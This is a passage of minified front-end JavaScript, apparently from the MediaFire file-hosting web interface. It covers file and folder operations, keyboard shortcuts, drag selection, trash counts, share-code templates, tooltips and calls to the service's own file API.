o,n=!0;if(o=function e(t,a){return t instanceof tH.yJ&&void 0!==t.parent.folderkey&&t.parent.folderkey!==t.folderkey?(a.push(t.folderkey),e(t.parent,a)):a}(a,[]),$.each(e.split(","),(function(e,t){$("#file-"+t).hide()})),$.each(t.split(","),(function(e,t){-1!=$.inArray(t,o)&&(n=!1)})),!0!==n)return!1;$.each(t.split(","),(function(e,t){$("#folder-"+t).hide()}))},LF.YO.onSuccess=function(e,t,a){$.publish((e[0].quickkey?"file":"folder")+"/move",[e,t,a])},LF.YO.onError=function(e,t,a){$.each(e.split(","),(function(e,t){$("#file-"+t).show()})),$.each(t.split(","),(function(e,t){$("#folder-"+t).show()}))},LF.aFI.onSuccess=function(e,t,a,o,n,r){n&&r?$.publish("filesandfolders/copy",[n,r,a,o]):$.publish((e[0].quickkey?"file":"folder")+"/copy",[e,t,a,o])},LF.aUA.onError=function(e,t,a){switch(av(),a){case 148:Ck();break;case 149:Eh(e,!1);break;case 153:aUG(e);break;case 155:Eh(e,!0);break;case 156:case 157:DisplayZipInsufficientBandwidthApproval();break;default:try{void 0!==t.message&&aH(0,t.message)}catch(e){}}},LF.Wt.onSuccess=function(e,t,a){$.publish("folder/create",[t,e]),a&&a.filedrop&&GH.afh.open(t.folderkey)},LF.aah.onSuccess=function(e){e&&$.publish((e.quickkey?"file":"folder")+"/update",[e,"privacy"])},LF.ajl.onSuccess=function(e){$.publish("file/save",e.filename)},LF.aal.onError=function(e,t){aTP()},LF.aal.onSuccess=function(e,t){e.desc=e.description,$.publish((e.quickkey?"file":"folder")+"/update",[e,t])},LF.agk.onSuccess=function(e,t){$.publish("file/delete",[[e],!0]),$.publish("file/update",[t,"replace"])},LF.agD.onSuccess=function(e){$.publish("file/update",[e,"password"])}}function aTG(){$(document).bind("keydown","esc",(function(){contextMenu.aoh(),mainList.aTN(),GH.abU(),aft(),$(".dropdown").removeClass("show_dropdown").unbind("clickoutside"),$(".dropdownOnClick").removeClass("show_dropdown").unbind("clickoutside")})).bind("keydown","u",(function(){var e=aek||!avH(tH.currentFolder.flag,"1"),t="2"==NZ(tH.currentFolder);0!=$("input:focus").length||e&&!t||bfw()||GLB_fSendToUploader(window.tH.currentFolder.folderkey||"myfiles")})).bind("keydown","ctrl+a",(function(){if(0==$("input:focus").length)return $(".dropdown").removeClass("show_dropdown").unbind("clickoutside"),mainList.akV(),!1})).bind("keydown","shift+del",(function(){if(0==$("input:focus").length&&!aek){if(tH.currentFolder&&("yes"==tH.currentFolder.shared||"child"==tH.currentFolder.shared))return;mainList.VB()&&(bfw()?LF.bet(mainList.WP("files"),mainList.WP("folders"),!1):GH.yw.open(mainList.WP("files"),mainList.WP("folders"),!1))}})).bind("keydown","del",(function(){if(0==$("input:focus").length&&!aek){if(tH.currentFolder&&("yes"==tH.currentFolder.shared||"child"==tH.currentFolder.shared))return;mainList.VB()&&(bfw()?LF.bet(mainList.WP("files"),mainList.WP("folders"),!0):GH.yw.open(mainList.WP("files"),mainList.WP("folders")))}})).bind("keydown","ctrl+home ctrl+end pageup pagedown home end",(function(){$(window).scroll()})).bind("keydown","n",(function(){var e=tH.currentFolder,t=0,a=!1;if(aTB(e)||(a=2==(t=NZ(e))||3==t),0==$("input:focus").length&&(!aek||a)&&!bfw())return GH.abV.open(window.abM),!1})),"Mac"==lc()&&$(document).bind("keydown","backspace",(function(e){0!=$("input:focus").length||aek||mainList.VB()&&(GH.yw.open(mainList.WP("files"),mainList.WP("folders")),e.preventDefault(),aeV(e))}))}function aTy(){$("#popup-section").show()}function aAw(){if(window.tH.root&&(window.tH.root.owner_name&&$("#collabmodeContact .collabContactName").text(window.tH.root.owner_name).attr("title",window.tH.root.owner_name),window.tH.root.avatar)){var e="";e=-1!==window.tH.root.avatar.indexOf("gravatar.com")?window.tH.root.avatar+"&"+aC(4):window.tH.root.avatar+"?"+aC(4),$("#collabmodeContact .shareContactAvatar").css("background-image","url("+e+")")}}function aSy(e){var t=afI.split(",");if(t.length>1){var a=new window.tH.yJ("myfiles");a.name="Shared Files",a.shared="yes",window.tH.folders.memory.myfiles=a,window.tH.root=a;var o=new MYF_CompletionCounter(t.length);$(".searchBtnMin").css("visibility","hidden"),$.each(t,(function(e,a){11==a.length||15==a.length?aeI(a,t,o):13==a.length?ahF(a,t,o):aeP(t,o)}))}else window.tH.root=new window.tH.yJ(afI),window.tH.root.shared="yes",window.tH.root.Yw({data:{recursive:"yes"}},{success:function(e,t){aAw(),agM(window.tH.root)},error:function(e,t,a){var o=JSON.parse(e.responseText),n={134:["You do not have access to view this folder. If this is your folder, please login."]};n[114]=n[134],n[112]=["Folder not found."];var r=n[o.response.error.toString()]||["An error occurred while retrieving the folder."];"114"===o.response.error.toString()&&(top.location.href="/error.php?errno=999&quickkey="+afI+"&origin=folder"),Zi(0,r[0])}});$(window).hashchange((function(){window.tH.aca=[],agM(window.tH.root)}))}function aSB(){if($("body").hasClass("myfiles")){$("#myfiles_wrap").css({overflow:"auto","-webkit-user-select":"none","-khtml-user-select":"none","-ms-user-select":"none","-moz-user-select":"none","-o-user-select":"none","user-select":"none"}),$("#myfiles_wrap").dragToSelect({selectables:"#main_list li",not:".collaborate-active",excludes:["li.row_container","#myfiles_viewtabs_bar","#myfiles_selection","#header","#contextmenu","#listbox_container",".popup","#folderTree"],selectedClass:"dragselect_selected",onShow:function(e){e||(mainList.aTN(),[],[],aQC=[],aRr=[]),"Internet Explorer"==BrowserName()&&"9.0"==Bm()&&(document.onselectstart=function(){return!1}),document.selection?document.selection.empty():window.getSelection&&window.getSelection().removeAllRanges()},onHide:function(e,t){var a=$("#main_list li:first");if(e||($.each(tH.MYF_oSelected.files.concat(tH.MYF_oSelected.folders),(function(e,t){tH.currentFolder.files[t]?tH.currentFolder.files[t].selected=!1:tH.currentFolder.folders[t].selected=!1})),tH.MYF_oSelected&&(tH.MYF_oSelected={files:[],folders:[]}),$("#main_list li").removeClass("file_selected")),a.length>0){var o=a.outerWidth(!0),n=a.outerHeight(!0),r=$("#main_list"),i=r.offset(),s=Math.min(i.left+r.innerWidth(),t.left+t.width),l=t.top+t.height,d=UO()?Math.floor(r.innerWidth()/o):1,c=Math.min(d,Math.max(0,Math.ceil((t.left-i.left)/o))),f=Math.min(d,Math.max(c,Math.ceil((s-i.left)/o))),u=$("#main_files_container").offset().top+r.position().top,p=Math.max(0,Math.ceil((t.top-u)/n)),h=Math.max(p,Math.ceil((l-u)/n));if(h>0&&0===p&&(p=1),f>0&&0===c&&(c=1),h>0&&f>0)for(var m=p;m<=h;m++)for(var g=c;g<=f;g++){var y=(m-1)*d-1+g;if(y>=0){var v=tH.aca[y];void 0!==v&&(v.quickkey?tH.MYF_oSelected.files[v.quickkey]||mainList.ZF(v.quickkey):v.folderkey&&(tH.MYF_oSelected.files[v.folderkey]||mainList.ZF(v.folderkey)))}}}return $selectedRows=$("#main_list .dragselect_selected"),$("#main_list .dragselect_selected").removeClass("dragselect_selected"),$selectedRows.addClass("file_selected"),$newSelectedRows=$("#main_list .file_selected"),"Internet Explorer"==BrowserName()&&setTimeout((function(){$.publish("list/selection"),document.onselectstart=null}),100),$(".myfiles").css({"-webkit-user-select":"text","-khtml-user-select":"text","-ms-user-select":"text","-moz-user-select":"text","-o-user-select":"text","user-select":"text"}),!0},onRefresh:function(){$(".myfiles").css({"-webkit-user-select":"text","-khtml-user-select":"text","-ms-user-select":"text","-moz-user-select":"text","-o-user-select":"text","user-select":"text"})},selectOnMove:!0})}}function aTj(){tH.aWM=!0,WC(""),aek||beg(),$(window).hashchange((function(){window.tH.bov&&clearTimeout(window.tH.bov),bff(),window.tH.aca=[],alb()})),aHa.aJg(),aek||alb(LF),aXK()}function amD(e,t){e&&$(document).ready((function(){LoadIframeLightbox("/dynamic/alert.php?alert_ids="+t,700,400)}))}function aXK(){document.getElementById("folderTree"),document.getElementById("main_files_container");var e=$("#fileDropWrap"),t=null;window.addEventListener&&(window.addEventListener("click",(function(t){e.removeClass("windowDragEnter folderDragEnter")}),!0),window.addEventListener("drop",(function(t){e.removeClass("windowDragEnter folderDragEnter")}),!0),window.addEventListener("dragenter",(function(a){if(tH.currentFolder&&(!aek&&avH(tH.currentFolder.flag,"1")||"2"==NZ(tH.currentFolder))){var o=a.dataTransfer.types?a.dataTransfer.types[0]:"";if(!bfw()&&!afv()&&o&&("Files"==o||"application/x-moz-file"==o||$("body").is(".safari")&&-1===o.indexOf("text"))){$("#ddFoldername").text(tH.currentFolder.name||"My Files"),e.addClass("windowDragEnter");var n=$(a.target);t&&(t=null,clearInterval(t)),n.is("#main_list li.folder, .folderlist_content li")||n.parents("#main_list li.folder, .folderlist_content li").length>0?e.addClass("folderDragEnter"):t=setTimeout((function(){e.removeClass("folderDragEnter")}),0)}}}),!0),window.addEventListener("dragleave",(function(t){(t.pageX<=0||t.pageY<=0||!t.currentTarget||t.pageX>=e.outerWidth())&&e.removeClass("windowDragEnter folderDragEnter")}),!0))}function amb(){$window.scroll(debounce((function(){bha||(aua(),window.tH.bkc=(new Date).getTime())}),23)).resize((function(){aHF=bz(),aua()}))}function aDA(e,t,a){return function(){if(!auO){auO=!0;var o=!UserEmail||UserEmail.length<=3,n="1"===aL("protrial_shown");if(!window.MF_PRO_TRIAL_LIGHTBOX||fu||o||n||!e)e&&blu("/templates/welcome/myfiles_welcome.php",895,570,{queue:!0}),t&&LoadIframeLightbox("/dynamic/template_popup.php?page=email_validation_lightbox",720,535,!1,!1,!0,!1,!1,!1,!0);else{blu("/widgets/premium_trial.php",591,296),aY("protrial_shown","1"),window.addEventListener("message",(function(e){if("https://checkout.mediafire.com"===e.origin)switch(e.data){case"mf-trial-close":LoadIframeLightbox("/templates/welcome/myfiles_welcome.php",895,570,!1,!1,!1,!1,!1);break;case"mf-trial-denied":LoadIframeLightbox("/templates/billing/cc_declined.html",591,376,!1,!1,!0,!1,!1)}}),!1)}MYF_WIDGET_STORAGE_calculateUsedStoragePercent(a),MYF_WIDGET_STORAGE_updateStorageDisplay(),e||aek||0!==a||GLB_fSendToUploader("myfiles")}}}function bed(e,t){var a,o,n=new window.tH.aCa(window.aCQ||0),r=[],i=[],s=-1,l=-1,d=-1;n.beN({content_type:"folders"},(function(n){if(n.response.folders)for(var c=0;c<n.response.folders.length;c++){var f=n.response.folders[c].folderkey;f&&r.push(f)}if(s=parseInt(n.response.folder_count,10)||0,-1!=l){if(d=s+l,$("#trash_restoreAll, #trash_deleteAll").toggle(d>0),$(".trashCan").text("Trash ("+d+" items)"),t){if(a=n.response.folders,void 0===o)return;return e({folders:a,files:o},d)}e({folders:r.join(),files:i.join()},d)}})),n.beN({content_type:"files"},(function(n){if(n.response.files)for(var c=0;c<n.response.files.length;c++){var f=n.response.files[c].quickkey;f&&i.push(f)}if(l=parseInt(n.response.file_count,10),-1!=s){if(d=s+l,$("#trash_restoreAll, #trash_deleteAll").toggle(d>0),$(".trashCan").text("Trash ("+d+" items)"),t){if(o=n.response.files,void 0===a)return;return e({folders:a,files:o},d)}e({folders:r.join(),files:i.join()},d)}}))}function beg(){var e=new window.tH.aCa(window.aCQ||0),t=-1,a=-1,o=-1;e.beN({data_only:"yes",content_type:"folders"},(function(e){e.response&&(t=parseInt(e.response.folder_count,10)||0,-1!=a&&(o=t+a,$("#trash_restoreAll, #trash_deleteAll").toggle(o>0),$(".trashCan").text("Trash ("+o+" items)")))})),e.beN({data_only:"yes",content_type:"files"},(function(e){e.response&&(a=parseInt(e.response.file_count,10),-1!=t&&(o=t+a,$("#trash_restoreAll, #trash_deleteAll").toggle(o>0),$(".trashCan").text("Trash ("+o+" items)")))}))}function aTs(e,t){e&&t&&(auA=aTY(),aTU())}function aTK(e){e&&(LT(document.getElementById("container")),LT(document.getElementById("footer")))}function bfu(e){$("#loadingMessage").text(e||"Working..."),$("body").addClass("pageLoad")}function bek(){$("body").removeClass("pageLoad");try{void 0!==window.parent.$&&window.parent.$("#mfAppFrameLoading").fadeOut(500,(function(){$(this).remove()}))}catch(e){}}function Rn(e){if(!e||!e.data.resources&&!e.data.resource)return!1;var t=e.data.resources?e.data.resources:e.data.resource;if(!tH.folders.yx(t))return!1;tH.yJ.asi(t,(function(e){$("#folder-"+t).toggleClass("sharedByUser",e.response.folder_info.shared_by_user),$("#mffb-"+t).toggleClass("sharedByUser",e.response.folder_info.shared_by_user),e.response.folder_info.shared_by_user?($("#folder-"+t).addClass("sharedByUser"),$("#mffb-"+t).addClass("sharedByUser")):($("#folder-"+t).removeClass("sharedByUser"),$("#mffb-"+t).removeClass("sharedByUser"))}))}function QZ(e){if(!e||0==e.length)return!1;aWc=tH.adq();var t={session_token:aWc,response_format:"json",quick_key:e};$.getJSON("/api/1.4/user/set_avatar.php",t,(function(){setTimeout((function(){$.getJSON("/api/1.4/user/get_avatar.php",{session_token:aWc,response_format:"json"},(function(e){var t="";t=-1!==e.response.avatar.indexOf("gravatar.com")?e.response.avatar+"&"+aC(4):e.response.avatar+"?"+aC(4),window.parent.$(".appAvatar").css("background-image","url("+t+")"),Zi(0,"Successfully Set Avatar")}))}),1e3)})).fail((function(e){e&&e.responseText||Zi(0,"Error: Unknown Error.");var t=JSON.parse(e.responseText),a=t.error;Zi(0,"Error: "+t.message+" ("+a+")")}))}function bnA(){var e,t=0,a=0,o=0,n=0,r=0,i=!0,s=0,l=["","",""],d=0;function c(e){d++;var o=[{r:1,css:{fontSize:15+Math.floor(20*Math.random())+"px",textShadow:"9999px 0 0 rgba(238, 238, 238, 0.5)"},v:2},{r:.6,css:{fontSize:50+Math.floor(20*Math.random())+"px",textShadow:"9999px 0 2px #eee"},v:6},{r:.2,css:{fontSize:90+Math.floor(30*Math.random())+"px",textShadow:"9999px 0 6px #eee"},v:12},{r:.1,css:{fontSize:150+Math.floor(50*Math.random())+"px",textShadow:"9999px 0 24px #eee"},v:20}],n=$('<span class="winternetz">'+l[Math.floor(Math.random()*l.length)]+"</span>").css({color:"#eee",display:"block",position:"fixed",background:"transparent",width:"auto",height:"auto",margin:"0",padding:"0",textAlign:"left",zIndex:9999});i&&n.css("textIndent","-9999px");for(var r=Math.random(),s=o.length,c=0;s--;)if(r<o[s].r){c=o[s].v,n.css(o[s].css);break}var f=-300+Math.floor(Math.random()*(t+300)),u=0;u=void 0!==e&&e?-300+Math.floor(Math.random()*(a+300)):-300,n.css({left:f+"px",top:u+"px"}),n.data("x",f),n.data("y",u),n.data("v",c),n.data("half_v",Math.round(.5*c)),$("body").append(n)}function f(){Math.random()>.8&&(s+=2*Math.random()-1,Math.abs(s)>3&&(s=s/Math.abs(s)*3));var a=(new Date).getTime(),i=a-e;e=a,i<55&&d<200?c():i>150&&($("span.winternetz:first").remove(),d--),$("span.winternetz").each((function(){var e=$(this).data("x"),a=$(this).data("y"),i=$(this).data("v"),l=$(this).data("half_v");a+=i,e+=Math.round(s*i),(e+=-l+Math.round(Math.random()*i))>o?e=-300:e<n&&(e=t),a>r?($(this).remove(),d--,c()):($(this).data("x",e),$(this).data("y",a),$(this).css({left:e+"px",top:a+"px"}),i>=6&&$(this).animate({rotate:"+="+l+"deg"},0))}))}$((function(){var s=function(){t=$(window).width(),a=$(window).height(),o=t+300,n=-300,r=a+300};s(),$(window).resize(s),$("body").css("textShadow")||(i=!1);var l=50;for(;l--;)c(!0);e=(new Date).getTime(),setInterval(f,50)}))}function LogDlErrorMyFiles(e,t){var a=window.asO||parent.asO;a&&a(e,t)}function du(e,t,a){for(var o="",n="",r=0;r<5;r++){o=r>0?r:"",(n=document.getElementById("sharedtabsfileinfo"+o+e+"-desc"))&&(n.innerHTML=t.replace(/"/g,"&#34;")),(n=document.getElementById("sharedtabsfileinfo"+o+e+"-tags"))&&(n.innerHTML=a.replace(/"/g,"&#34;"))}}function dL(e){for(var t=1;document.getElementById(e+t+"-1")&&t<=20;t++)ae("sharetabsfile"+t+"-",1),Xc(0,document.getElementById("sharetemplatefile"+t),t,"sharedtabsfileinfo"+t+"-")}function dT(e,t){var a=document.getElementById("preview_img");a&&(e>4&&(e=4),a.src="http://www.mediafire.com/conv/"+t+e+"g.jpg")}function Xc(e,t,a,o){if(!t)return!1;var n="";n=cY(n=hU[e],o,a),t.innerHTML=n}function ae(e,t){for(var a,o=1;a=document.getElementById(e+o);o++)a.className=o==t?"current":"sharetab"}function cW(e,t,a,o){var n=document.getElementById("uploaded_html_"+t+"41"),r=document.getElementById("uploaded_bbs_"+t+"42");n&&r&&(n.value="<a href='http://www.mediafire.com/view/"+o+"' target='_blank'><img src='http://www.mediafire.com/convkey/"+a.substr(0,4)+"/"+o+e+"g.jpg' border='0' alt='Simple, Free Image and File Hosting at MediaFire'></a>",r.value="[URL=http://www.mediafire.com/view/"+o+"][IMG]http://www.mediafire.com/convkey/"+a.substr(0,4)+"/"+o+e+"g.jpg[/IMG][/URL]")}function cY(e,t,a){e=e.replace(/#FILENAME#/g,document.getElementById(t+"fn").value);var o="",n="";""==document.getElementById(t+"desc").innerHTML?(o="<span style='color: #555'>No description entered</span>",n="No description entered"):(o=document.getElementById(t+"desc").innerHTML,n=document.getElementById(t+"desc").innerHTML),e=(e=(e=(e=e.replace(/#DESCRIPTION#/g,o.replace(/"/g,"&#34;"))).replace(/#DESCRIPTION_URL#/g,escape(n))).replace(/#DESCRIPTION_ORIG#/g,document.getElementById(t+"desc").innerHTML.replace(/"/g,"&#34;"))).replace(/#FILENUM#/g,a);var r=document.getElementById(t+"tags").innerHTML;if(r=(r=r.replace(/&lt;/g,"<")).replace(/&gt;/g,">"),e=(e=(e=(e=(e=(e=(e=(e=(e=(e=(e=e.replace(/#TAGS_URL#/g,escape(r))).replace(/#TAGS_DISP#/g,r)).replace(/#IMGKEY#/g,document.getElementById(t+"imgkey").value)).replace(/#FILENAME#/g,document.getElementById(t+"fn").value)).replace(/#FILENAME_URL#/g,escape(document.getElementById(t+"fn").value))).replace(/#UPLOADDATE#/g,document.getElementById(t+"upload").value)).replace(/#FILESIZE#/g,document.getElementById(t+"fs").value)).replace(/#DOWNLOADS#/g,document.getElementById(t+"dls").value)).replace(/#TAGS#/g,document.getElementById(t+"tagorig").value.replace(/"/g,"&#34;"))).replace(/#RAND1#/g,aC(5))).replace(/#FILENUM#/g,db(1e3,3e3)),1==lB)e=(e=e.replace(/#SSL#/g,"s")).replace(/#URLKEY#/g,"");else{e=e.replace(/#SSL#/g,"");var i=aX(document.getElementById(t+"imgkey").value);isNaN(i)&&(e=(e=e.replace(/#NOIMG_START#/g,"\x3c!--")).replace(/#NOIMG_END#/g,"--\x3e")),e=e.replace(/#URLKEY#/g,i)}var s=document.getElementById(t+"show_cantbrowse");e=s&&s&&1==s.value?e.replace(/#STYLE_CANTBROWSE#/g,""):e.replace(/#STYLE_CANTBROWSE#/g,"display: none");var l=document.getElementById(t+"show_owner");e=l&&1==l.value?e.replace(/#STYLE_SHOWOWNER#/g,""):e.replace(/#STYLE_SHOWOWNER#/g,"display: none");var d=document.getElementById(t+"show_download");if(e=d&&1==d.value?e.replace(/#STYLE_SHOWDOWNLOAD#/g,""):e.replace(/#STYLE_SHOWDOWNLOAD#/g,"display: none"),2==document.getElementById(t+"folder").value){var c=String(document.getElementById(t+"qk").value);e=13==c.length?e.replace(/#QUICKKEY#/g,c):e.replace(/#QUICKKEY#/g,"sharekey="+c)}else e=e.replace(/#QUICKKEY#/g,document.getElementById(t+"qk").value);e=1==document.getElementById(t+"folder").value?(e=e.replace(/#STYLE_FILEONLY#/g,"")).replace(/#STYLE_NOTFILE#/g,"display: none"):(e=e.replace(/#STYLE_FILEONLY#/g,"display: none")).replace(/#STYLE_NOTFILE#/g,""),e=1==document.getElementById(t+"showpicture").value?(e=e.replace(/#STYLE_PICTURE#/g,"")).replace(/#STYLE_NOTPICTURE#/g,"display: none"):(e=e.replace(/#STYLE_NOTPICTURE#/g,"")).replace(/#STYLE_PICTURE#/g,"display: none"),e=1==document.getElementById(t+"showpicturebox").value?e.replace(/#STYLE_PICTUREBOX#/g,""):e.replace(/#STYLE_PICTUREBOX#/g,"display: none"),document.getElementById(t+"nonmyfiles")&&(e=1==document.getElementById(t+"nonmyfiles").value?e.replace(/#STYLE_HIDENONMYFILES#/g,"display: none"):e.replace(/#STYLE_HIDENONMYFILES#/g,"")),e=0==document.getElementById(t+"savemyfiles").value?e.replace(/#STYLE_SAVE#/g,""):e.replace(/#STYLE_SAVE#/g,"display: none"),e=1==document.getElementById(t+"editinfo").value?e.replace(/#STYLE_EDITINFO#/g,""):e.replace(/#STYLE_EDITINFO#/g,"display: none");var f=document.getElementById(t+"showviewimage");return e=f&&1==f.value?e.replace(/#STYLE_VIEWIMAGE#/g,""):e.replace(/#STYLE_VIEWIMAGE#/g,"display: none"),e=(e=(e=1==UserLogin?e.replace(/#EMAILADDY#/g,UserEmail):e.replace(/#EMAILADDY#/g,"")).replace(/#NOIMG_START#/g,"")).replace(/#NOIMG_END#/g,"")}!function(e){zo=function(t,a){var o=this;o.$PRG_oRoot=e(t);o.ahC=a,o.aiB="progress-current",o.ahU="progress-total",o.aih=function(){},o.ajd=!1,o.adH=100},zo.prototype.aiy=function(e,t,a){var o=this;o.ajd=!1,a&&o.ajA(a),o.$PRG_oRoot.html('<p><span id="'+o.aiB+'">0</span> / <span id="'+o.ahU+'">0</span> '+o.aiY()+' &hellip;</p><div class="progressbar sm"><div id="progress-bar-filled"></div></div>'),t&&o.aiw(t),e?o.aje(e):o.aje(0)},zo.prototype.alq=function(e){this.adH=parseInt(e)},zo.prototype.alz=function(){return parseInt(this.adH)},zo.prototype.aia=function(e){var t=this,a=e+t.aiu();t.aje(Math.min(a,t.ajp()))},zo.prototype.aje=function(t){var a=this,o=a.ajp(),n=Math.max(Math.min(t,o),0);e("#"+a.aiB).text(n||0),e("#progress-bar-filled").css("width",Math.min(n/o*100||0,100)+"%"),(n==o||n/o*100>=a.adH)&&o>0&&!a.ajd&&(a.ajd=!0,a.aih.apply())},zo.prototype.aiu=function(){return parseInt(e("#"+this.aiB).text())||0},zo.prototype.aiw=function(t){e("#"+this.ahU).text(t||0)},zo.prototype.ajp=function(){return parseInt(e("#"+this.ahU).text())||0},zo.prototype.ajA=function(e){this.ahC=e},zo.prototype.aiY=function(){return this.ahC||""},zo.prototype.ajs=function(e){this.aih=e}}(jQuery);var fS=0,mk=0,nF=0,oG="",oN="",ov=10,nb=10;function bak(){var e=document.getElementById("input_time_start"),t=document.getElementById("time_start"),a=(new Date).getTime()-864e5*window.P7_iStartLimit,o=e.value.match(/(\d+)/g),n=new Date(o[0],o[1]-1,o[2]).getTime(),r=e.value+"";if(n<a){var i=new Date(a),s=("0"+(i.getMonth()+1)).slice(-2);r=("0"+i.getDate()).slice(-2);r=i.getFullYear()+"-"+s+"-"+r}e&&t&&(t.value=r,e.value=r)}function bbp(){var e=document.getElementById("input_time_end"),t=document.getElementById("time_end");e&&t&&(t.value=e.value+"")}function addwarning(){var e=document.getElementsByTagName("a");if(e)for(var t=0;t!=e.length;t++)"addToolTip"==e[t].className&&(e[t].setAttribute("tooltiptext",e[t].title),e[t].removeAttribute("title"),e[t].onmouseover=function(){eb(this.getAttribute("tooltiptext"))},e[t].onmouseout=function(){asZ()})}var offsetfromcursorX=-7,offsetfromcursorY=23,offsetdivfrompointerX=13,offsetdivfrompointerY=13;document.write('<div id="theToolTip"></div>');var ie=document.all,ns6=document.getElementById&&!document.all,enabletip=!1;if(ie||ns6)var tipobj=document.all?document.all.theToolTip:document.getElementById?document.getElementById("theToolTip"):"";var pointerobj=document.all?document.all.ToolTipPointer:document.getElementById?document.getElementById("ToolTipPointer"):"";function ietruebody(){return document.compatMode&&"BackCompat"!=document.compatMode?document.documentElement:document.body}function eb(e,t,a){if(ns6||ie)return void 0!==t&&(tipobj.style.width=t+"px"),void 0!==a&&""!==a&&(tipobj.style.backgroundColor=a),tipobj.innerHTML=e,enabletip=!0,!1}function positiontip(e){if(enabletip){var t=!1,a=ns6?e.pageX:event.clientX+ietruebody().scrollLeft,o=ns6?e.pageY:event.clientY+ietruebody().scrollTop,n=ie&&!window.opera?ietruebody().clientWidth:window.innerWidth-20,r=ie&&!window.opera?ietruebody().clientHeight:window.innerHeight-20,i=ie&&!window.opera?n-event.clientX-offsetfromcursorX:n-e.clientX-offsetfromcursorX,s=ie&&!window.opera?r-event.clientY-offsetfromcursorY:r-e.clientY-offsetfromcursorY,l=offsetfromcursorX<0?-1*offsetfromcursorX:-1e3;i<tipobj.offsetWidth?(tipobj.style.left=a-tipobj.offsetWidth+"px",t=!0):a<l?tipobj.style.left="5px":(tipobj.style.left=a+offsetfromcursorX-offsetdivfrompointerX+"px",pointerobj.style.left=a+offsetfromcursorX+"px"),s<tipobj.offsetHeight?(tipobj.style.top=o-tipobj.offsetHeight-offsetfromcursorY+"px",t=!0):(tipobj.style.top=o+offsetfromcursorY+offsetdivfrompointerY+"px",pointerobj.style.top=o+offsetfromcursorY+"px"),tipobj.style.visibility="visible",pointerobj.style.visibility=t?"hidden":"visible"}}function asZ(){(ns6||ie)&&(enabletip=!1,tipobj.style.visibility="hidden",pointerobj.style.visibility="hidden",tipobj.style.left="-1000px",tipobj.style.backgroundColor="",tipobj.style.width="")}function Tk(){document.onmousemove=positiontip,addwarning()}function ee(){if(title="MediaFire - Cloud storage for everyone.",url="http://www.mediafire.com",window.sidebar)window.sidebar.addPanel(title,url,"");else if(window.external)window.external.AddFavorite(url,title);else if(window.opera&&window.print)return alert("Sorry, your web browser does not support automatically adding Bookmarks/Favorites.  Press 'Ctrl-D' in Firefox or 'Ctrl-T' in Opera to manually bookmark MediaFire."),!0}!function(){function e(e,t,a,o){this.type=e,this.WF=t,this.Wm=a,this.auQ=o||!1,this.manifest={},this.atW=!0,this.memory={}}e.prototype.ave=function(){this.auQ=!0,window.localStorage&&localStorage.clear()},e.prototype.ats=function(){this.auQ=!1},e.prototype.auX=function(){this.atW=!1},e.prototype.yx=function(e){return e?this.memory[e]?this.memory[e]:void 0:(sizeOf(this.memory),this.memory)},e.prototype.auT=function(){return!(this.auq||!this.atW||!window.localStorage)&&(!!localStorage["manifest-"+this.type]&&(this.manifest=JSON.parse(localStorage["manifest-"+this.type]),!0))},e.prototype.atY=function(){return!(this.auq||!this.atW||!window.localStorage)&&(this.manifest=amJ(this.memory,1),!0)},e.prototype.atG=function(){return!(this.auq||!this.atW||!window.localStorage)&&(localStorage["manifest-"+this.type]=JSON.stringify(this.manifest),!0)},e.prototype.Yx=function(e,t){this.memory[e]=t},e.prototype.abg=function(e){this.memory[e]&&delete this.memory[e]},e.prototype.abE=function(){for(var e in this.memory)this.memory.hasOwnProperty(e)&&delete this.memory[e]},window.XV=e}(),function(e){var t,a,o=45e3,n=3,r=new O(2),i=4e3,s=[],l={},d=100,c={},f=function(){},u=null,p=null,h=!1,m={prev:"",count:0};function g(e,t){var a=this;if(t){for(;a!=a.parent&&(a=a.parent);)if(a===e)return!0;return!1}return e===this.parent}function y(e){e||(e=6048e5),null!=u&&(clearTimeout(u),u=null);var t=+new Date+e;u=setTimeout((function(){var e=+new Date;e<t?y(t-e):(dZ(),Zi(3,"Logging off due to inactivity..."),setTimeout(dS,2e3))}),e)}function v(e){return"function"==typeof e?e:e&&e.success&&"function"==typeof e.success?e.success:function(){}}function w(e){return e&&e.error&&"function"==typeof e.error?e.error:c.error?c.error:function(){}}function b(e){var t={};return t.success=v(e),t.error=w(e),t}function _(t,a){this.filename="",this.created="",this.desc="",this.description="",this.tags="",this.note="",this.privacy="public",this.password_protected="no",this.size=0,this.downloads=0,this.flag=0,this.hash="",this.parent="",this.filetype="",this.image_status="ready",this.preview="no","string"==typeof t?this.quickkey=t:t&&e.extend(this,t),void 0!==a&&(void 0===a.files&&a.myfiles&&(a=a.myfiles,this.parent_name=a.name),this.parent=a,a.files||(a.files={}),a.files[this.quickkey]=this)}function k(t,a){this.desc="",this.description="",this.tags="",this.created="",this.privacy="public",this.custom_url="",this.shared="",this.dropbox_enabled="",this.avatar="",this.parent="",this.owner_name="",this.file_count="0",this.flag=0,this.folder_count=0,this.total_folders=0,this.total_files=0,"string"==typeof t?this.folderkey=t:t&&e.extend(this,t),void 0!==a&&(this.parent=a),this.folders||(this.folders={}),this.files||(this.files={})}function x(e){this.session_token=e||t}function H(e){this.session_token=e||t}function C(){if(!UserEmail||UserEmail.length<=3)window.QS&&QS("Session Expired","Your session has expired. You will be logged out",[["ok","  OK  "]],(function(){window.dS&&dS()}));else if(!h&&0!=e("#modal_window_popup").length){if(h=!0,"http:"==window.top.location.protocol)return window.localStorage&&localStorage.clear(),void(top.location="/logout.php");blu("/templates/confirm/confirm_login.php",415,265,{hideCloseButton:!0,queue:!1,forceUserAction:!0,onLoadCallback:function(){e("#modal_msg_iframe")[0].contentWindow.bqJ=a},transparent:!1})}function a(e){t=e,"undefined"!=typeof beR&&beR(t),h=!1,r.Zl()}}function $(){}function S(){}function E(e){this.aCh=e||0}function F(e,t){return e.aag()-t.aag()}function I(){var e=aL(p);if(e)for(var t=JSON.parse(e),a=(new Date).getTime(),o=0;o<t.length;o++){var n=t[o],r=n.id.split("::");a-parseInt(r[1],10)<=18e4&&(L(n.options,n.priority,!1),T(n.id))}}function T(e){var t=aL(p);if(t)for(var a=JSON.parse(t),o=0;o<a.length;o++)if(a[o].id==e){a.splice(o,1),a.length>0?aU(p,JSON.stringify(a),300):baO(p);break}}_.Zo=function(e){return e instanceof _},_.YH=function(t,a){L(e.extend({type:"POST",url:"/api/1.4/file/delete.php?r="+aC(4),data:{quick_key:t}},b(a)),1,!0)},_.beo=function(t,a){L(e.extend({type:"POST",url:"/api/1.4/file/purge.php?r="+aC(4),data:{quick_key:t}},b(a)),1,!0)},_.aVK=function(t){var 